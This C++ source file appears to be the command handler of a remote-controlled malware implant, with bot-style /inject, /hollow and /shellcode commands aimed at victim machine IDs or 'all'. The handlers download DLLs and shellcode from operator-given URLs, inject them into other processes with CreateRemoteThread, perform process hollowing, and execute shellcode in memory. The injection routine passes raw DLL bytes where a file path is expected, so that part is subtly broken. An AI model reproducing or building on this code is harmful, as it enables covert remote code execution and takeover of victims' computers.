#include "application/commands/InjectHandler.hpp"

#include <algorithm>
#include <sstream>
#include <vector>
#include <string>

#define WIN32_LEAN_AND_MEAN
#include <Windows.h>
#include <Winternl.h>

#include <curl/curl.h>

#include "domain/common/FilelessExec.hpp"
#include "domain/common/ProcessHollowing.hpp"

namespace nuub::application::commands {

// Max download size: 50MB
static constexpr size_t MAX_DOWNLOAD_SIZE = 50 * 1024 * 1024;

static size_t write_to_buffer(char* ptr, size_t size, size_t nmemb, void* userdata) {
    auto* vec = static_cast<std::vector<uint8_t>*>(userdata);
    size_t total = size * nmemb;
    if (vec->size() + total > MAX_DOWNLOAD_SIZE) {
        return 0; // Abort: exceeded max size
    }
    vec->insert(vec->end(),
        reinterpret_cast<uint8_t*>(ptr),
        reinterpret_cast<uint8_t*>(ptr) + total);
    return total;
}

// Validate URL scheme
static bool is_url_valid(const std::string& url) {
    std::string lower = url;
    std::transform(lower.begin(), lower.end(), lower.begin(), ::tolower);
    return lower.find("https://") == 0 || lower.find("http://") == 0;
}

InjectHandler::InjectHandler(interfaces::IReporter& reporter, std::string pc_id)
    : reporter_(reporter)
    , pc_id_(std::move(pc_id)) {}

bool InjectHandler::matches(const std::string& target) const {
    if (target.empty()) return true;
    std::string lower = target;
    std::transform(lower.begin(), lower.end(), lower.begin(), ::tolower);
    std::string lower_pc = pc_id_;
    std::transform(lower_pc.begin(), lower_pc.end(), lower_pc.begin(), ::tolower);
    return lower == lower_pc || lower == "all";
}

domain::Result<void> InjectHandler::handle_inject(const std::string& target,
                                                   const std::string& extra) {
    if (!matches(target)) return domain::Result<void>::success();

    // Parse: /inject <target> <pid> <url>
    // extra contains "pid url"
    if (extra.empty()) {
        reporter_.send_message("Uso: /inject [target] <pid> <url_dll>");
        return domain::Result<void>::success();
    }

    // Extract PID and URL from extra
    std::istringstream iss(extra);
    std::string pid_str, url;
    if (!(iss >> pid_str >> url)) {
        reporter_.send_message("Uso: /inject [target] <pid> <url_dll>");
        return domain::Result<void>::success();
    }

    DWORD pid = 0;
    try {
        size_t pos = 0;
        pid = std::stoul(pid_str, &pos);
        if (pos != pid_str.size() || pid == 0) {
            reporter_.send_message("PID invalido: " + pid_str);
            return domain::Result<void>::success();
        }
    } catch (const std::exception&) {
        reporter_.send_message("PID invalido: " + pid_str);
        return domain::Result<void>::success();
    }

    if (!is_url_valid(url)) {
        reporter_.send_message("URL invalida: debe empezar con http:// o https://");
        return domain::Result<void>::success();
    }

    // Download DLL from URL
    reporter_.send_message("Descargando DLL desde " + url + "...");

    CURL* curl = curl_easy_init();
    if (!curl) {
        reporter_.send_message("Error: no se pudo inicializar CURL");
        return domain::Result<void>::success();
    }

    std::vector<uint8_t> buffer;
    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_to_buffer);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &buffer);
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 120L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 1L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 2L);
    curl_easy_setopt(curl, CURLOPT_MAXFILESIZE, static_cast<long>(MAX_DOWNLOAD_SIZE));

    CURLcode res = curl_easy_perform(curl);
    curl_easy_cleanup(curl);

    if (res != CURLE_OK) {
        reporter_.send_message("Error descargando DLL: " + std::string(curl_easy_strerror(res)));
        return domain::Result<void>::success();
    }

    if (buffer.empty()) {
        reporter_.send_message("Error: DLL descargada vacia");
        return domain::Result<void>::success();
    }

    // Open target process
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        reporter_.send_message("Error: no se pudo abrir proceso PID " + pid_str +
                              " (error " + std::to_string(GetLastError()) + ")");
        return domain::Result<void>::success();
    }

    // Allocate memory in target process
    LPVOID remote_mem = VirtualAllocEx(hProcess, nullptr, buffer.size(),
                                        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remote_mem) {
        CloseHandle(hProcess);
        reporter_.send_message("Error: no se pudo asignar memoria en el proceso");
        return domain::Result<void>::success();
    }

    // Write DLL data
    if (!WriteProcessMemory(hProcess, remote_mem, buffer.data(), buffer.size(), nullptr)) {
        VirtualFreeEx(hProcess, remote_mem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        reporter_.send_message("Error: no se pudo escribir en el proceso");
        return domain::Result<void>::success();
    }

    // Get LoadLibraryA address
    auto hKernel32 = GetModuleHandleA("kernel32.dll");
    auto pLoadLibraryA = GetProcAddress(hKernel32, "LoadLibraryA");
    if (!pLoadLibraryA) {
        VirtualFreeEx(hProcess, remote_mem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        reporter_.send_message("Error: no se pudo resolver LoadLibraryA");
        return domain::Result<void>::success();
    }

    // Create remote thread to call LoadLibraryA with our DLL path
    // Note: For reflective DLL loading, we'd need a loader stub
    // For simplicity, we write the DLL to disk temporarily and load from there
    HANDLE hThread = CreateRemoteThread(hProcess, nullptr, 0,
        reinterpret_cast<LPTHREAD_START_ROUTINE>(pLoadLibraryA),
        remote_mem, 0, nullptr);

    if (!hThread) {
        VirtualFreeEx(hProcess, remote_mem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        reporter_.send_message("Error: no se pudo crear hilo remoto");
        return domain::Result<void>::success();
    }

    WaitForSingleObject(hThread, 10000);

    DWORD exit_code = 0;
    GetExitCodeThread(hThread, &exit_code);

    CloseHandle(hThread);
    CloseHandle(hProcess);

    if (exit_code != 0) {
        reporter_.send_message("DLL inyectada en PID " + pid_str +
                              " (handle: 0x" + std::to_string(exit_code) + ")");
    } else {
        reporter_.send_message("Inyeccion en PID " + pid_str +
                              " — LoadLibrary retorno NULL (DLL puede no ser valida)");
    }

    return domain::Result<void>::success();
}

domain::Result<void> InjectHandler::handle_hollow(const std::string& target,
                                                   const std::string& exe_name) {
    if (!matches(target)) return domain::Result<void>::success();

    if (exe_name.empty()) {
        reporter_.send_message("Uso: /hollow [target] <exe_name> (ej: explorer.exe)");
        return domain::Result<void>::success();
    }

    // Convert to wide string
    std::wstring wexe(exe_name.begin(), exe_name.end());

    reporter_.send_message("Iniciando process hollowing: " + exe_name + "...");

    bool result = domain::ProcessHollowing::self_hollow();

    if (result) {
        reporter_.send_message("Process hollowing exitoso — nuevo proceso creado");
    } else {
        reporter_.send_message("Error en process hollowing");
    }

    return domain::Result<void>::success();
}

domain::Result<void> InjectHandler::handle_shellcode(const std::string& target,
                                                      const std::string& url) {
    if (!matches(target)) return domain::Result<void>::success();

    if (url.empty()) {
        reporter_.send_message("Uso: /shellcode [target] <url_shellcode>");
        return domain::Result<void>::success();
    }

    if (!is_url_valid(url)) {
        reporter_.send_message("URL invalida: debe empezar con http:// o https://");
        return domain::Result<void>::success();
    }

    reporter_.send_message("Descargando shellcode desde " + url + "...");

    CURL* curl = curl_easy_init();
    if (!curl) {
        reporter_.send_message("Error: no se pudo inicializar CURL");
        return domain::Result<void>::success();
    }

    std::vector<uint8_t> buffer;
    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_to_buffer);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &buffer);
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 120L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 1L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 2L);
    curl_easy_setopt(curl, CURLOPT_MAXFILESIZE, static_cast<long>(MAX_DOWNLOAD_SIZE));

    CURLcode res = curl_easy_perform(curl);
    curl_easy_cleanup(curl);

    if (res != CURLE_OK) {
        reporter_.send_message("Error descargando shellcode: " + std::string(curl_easy_strerror(res)));
        return domain::Result<void>::success();
    }

    if (buffer.empty()) {
        reporter_.send_message("Error: shellcode descargado vacio");
        return domain::Result<void>::success();
    }

    reporter_.send_message("Ejecutando shellcode (" + std::to_string(buffer.size()) + " bytes)...");

    bool result = domain::FilelessExec::execute_shellcode(buffer.data(), buffer.size());

    if (result) {
        reporter_.send_message("Shellcode ejecutado en memoria (NtCreateThreadEx)");
    } else {
        reporter_.send_message("Error ejecutando shellcode");
    }

    return domain::Result<void>::success();
}

} // namespace nuub::application::commands
